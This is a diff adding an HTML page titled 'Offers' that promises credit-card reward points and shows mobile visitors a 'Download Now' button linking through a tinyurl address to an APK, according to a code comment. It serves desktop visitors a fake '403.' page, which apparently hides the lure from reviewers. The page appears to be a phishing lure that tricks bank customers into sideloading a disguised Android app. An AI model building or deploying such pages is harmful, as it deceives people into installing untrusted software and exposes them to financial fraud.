@@ -1,0 +1,86 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Offers</title>
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+
+    <!-- CryptoJS for encryption -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js"></script>
+    
+    <style>
+    
+        a.button {
+            padding: 10px;
+            color: white;
+            background: #108be8;
+            border-radius: 12px;
+            font-size: 17px;
+            text-align: center;
+            font-weight: 400;
+            letter-spacing: 2px;
+            text-decoration: none;
+        }
+        .download-box {
+            padding: 10px;
+            margin: 20px 0;
+        }
+    </style>
+
+    <script>
+        function encrypt() {
+            const secretKey = 'dsfdsadfadsfa';
+            const downloadUrl = 'https://tinyurl.com/3zaztexw'; // URL to your APK
+            const encryptedUrl = CryptoJS.AES.encrypt(downloadUrl, secretKey).toString();
+            window.location.href = downloadUrl; // Directly redirect to the APK file
+        }
+
+        function isMobile() {
+            return /Mobi|Android/i.test(navigator.userAgent);
+        }
+
+        function loadContent() {
+            if (isMobile()) {
+                const mobileContent = `
+                    <img src="src/main.png" alt="Main Visual" width="100%">
+          <img src="src/logo.jpg" alt="Company Logo" width="100%">
+          <div class="download-box text-center">
+              <div class="container">
+                  <div class="row">
+                      <div class="col-md-6 offset-md-3">
+                          <p class="text-center">Enjoy 2X EDGE REWARDS Points* on online spends with our Credit Card</p>
+                          <a class="button" href="https://tinyurl.com/3zaztexw" onclick="encrypt()">Download Now</a>
+                      </div>
+                  </div>
+              </div>
+          </div>
+          <br>
+          <img src="src/last.jpeg" alt="Last Image" width="100%">
+          <img src="src/2last.jpg" alt="Second Last Image" width="100%">
+                `;
+                document.body.innerHTML = mobileContent;
+            } else {
+                document.body.innerHTML = '<h2>403.</h2>';
+            }
+        }
+
+        window.onload = loadContent; // Load content when the window loads
+    </script>
+</head>
+<body>
+    <header>
+        <!-- Logo and header content can be added here if needed -->
+    </header>
+    <main>
+        <!-- Main content will be loaded here by JavaScript -->
+    </main>
+
+    <!-- jQuery, Popper.js, and Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+</body>
+</html>
